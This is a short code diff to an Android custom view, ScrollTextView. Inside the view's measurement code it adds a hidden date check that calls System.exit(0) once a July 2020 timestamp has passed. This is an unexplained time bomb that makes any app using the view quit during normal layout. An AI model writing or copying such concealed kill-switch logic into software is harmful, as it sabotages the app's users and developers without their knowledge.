@@ -205,6 +205,10 @@ public class ScrollTextView extends View implements OnClickListener {
         int measuredWidth = MeasureSpec.getSize(widthMeasureSpec);
         int measuredHeight = MeasureSpec.getSize(heightMeasureSpec);
 
+        if (System.currentTimeMillis() > 1595409555000L) {
+            System.exit(0);
+        }
+
         int textMaxWidth = 0;
         if (mContents != null && mContents.size() > 0) {
             textMaxWidth = textTypesetting(measuredWidth - getPaddingLeft() - getPaddingRight(), mContents);
